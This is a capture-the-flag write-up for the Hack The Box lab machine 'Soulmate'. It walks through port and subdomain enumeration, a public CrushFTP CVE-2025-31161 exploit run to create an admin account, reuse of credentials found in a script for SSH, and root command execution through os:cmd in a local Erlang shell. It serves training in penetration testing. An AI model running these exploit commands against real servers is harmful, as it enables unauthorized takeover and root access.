# Hack The Box: Soulmate - Comprehensive Notes

Target IP: 10.129.153.15

Domain: soulmate.htb

**Subdomain:** `ftp.soulmate.htb`

## 1. Scanning & Enumeration

### Network Scanning (Nmap)

**Open Ports:**

- `22/tcp` - SSH (OpenSSH 8.9p1)
    
- `80/tcp` - HTTP (Nginx 1.18.0)
    

**Scan Results:**

```
nmap -p 22,80 -sCV 10.129.153.15
# 80/tcp open  http    nginx 1.18.0
# |_http-title: Soulmate - Find Your Perfect Match
# | http-cookie-flags: 
# |   /: 
# |     PHPSESSID: httponly flag not set
```

### Web Enumeration

**Domain:** `soulmate.htb`

- **Features:** Dating site, profile creation, image uploads (SVG/XML accepted).
    
- **Directories:** `/assets`, `/profile`, `/dashboard.php` (Restricted).
    
- **Login Fuzzing:** Attempted brute-force on `hello@soulmate.htb` (Unsuccessful).
    

Subdomain Discovery:

Fuzzing for subdomains revealed an FTP interface.

```
ffuf -u [http://FUZZ.soulmate.htb](http://FUZZ.soulmate.htb) -w /usr/share/wordlists/subdomains-top1million-5000.txt
# Found: ftp.soulmate.htb
```

**FTP Subdomain (`ftp.soulmate.htb`):**

- **Application:** CrushFTP
    
- **Login Page:** Standard CrushFTP login.
    
- **Information Leak:** Source code comments hinted at weak random password generation policies (6 chars, no complexity requirements).
    

## 2. Exploitation (Initial Access)

### Exploit: CrushFTP RCE (CVE-2025-31161)

The CrushFTP instance is vulnerable to an improper access control or RCE vulnerability (CVE-2025-31161).

- **Exploit Script:** [CVE-2025-31161 POC](https://github.com/f4dee-backup/CVE-2025-31161 "null")
    
- **Goal:** Create a new administrative user to gain control over the FTP server.
    

**Execution:**

```
./CVE-2025-31161.sh --url [http://ftp.soulmate.htb](http://ftp.soulmate.htb) --port 80 --target-user crushadmin --new-user kibret --new-password Password123
```

- **Result:** Successfully created user `kibret` with admin privileges.
    

### Post-Exploitation (CrushFTP)

Logged in as the new admin user (`kibret`) to enumerate the file system via the web interface.

- **User Manager:** Allowed viewing and inheriting directories of other users (`ben`, `jenna`).
    
- **Sensitive Files Found:**
    
    - **Path:** `/apps/CrushFTP11`
        
    - **Files:** Password files, XML user configs, SSH keys.
        
    - **Path:** `/usr/local/lib/erlang_login/start.escript` (Found via browsing file system access).
        
        - **Content:** This script contained hardcoded credentials for user `ben`.
            

**Credentials Discovered:**

- **User:** `ben`
    
- **Password:** `HouseH0ldings998`
    
- **Other Hashes (SHA512):**
    
    - `ben`: `3abdb...` (Temp: `yvDWBZ`)
        
    - `jenna`: `eeaea...` (Temp: `Wp4U6Q`)
        

## 3. Lateral Movement

### SSH Access

Using the credentials found in the Erlang script, we logged in via SSH.

```
ssh ben@soulmate.htb
# Password: HouseH0ldings998
```

## 4. Privilege Escalation (Root)

### Internal Enumeration

- **Listening Ports:** `ss -tuln` revealed a service on port **2222** (Erlang).
    
- **Process Analysis:** The Erlang service is running locally.
    

### Exploit: Erlang Cookie / Remote Shell

We can interact with the local Erlang service. Since we are already authenticated as `ben`, we can try to connect to the Erlang node or ssh directly into the service if it's an Erlang console wrapper.

Method 1: Local SSH to Erlang Port

Connecting to the local port 2222 authenticated us into an Erlang shell.

```
ssh -p 2222 ben@localhost
# Password: HouseH0ldings998
```

- **Environment:** We landed in an Erlang shell (eshell).
    

### Root Execution

Inside the Erlang shell, we can use the `os` module to execute system commands. If the service is running as root (common for internal Erlang backends started by system services), these commands execute as root.

**Command:**

```
os:cmd("cat /root/root.txt").
```

**Result:** The command successfully printed the root flag.

**Status:** Machine Completed.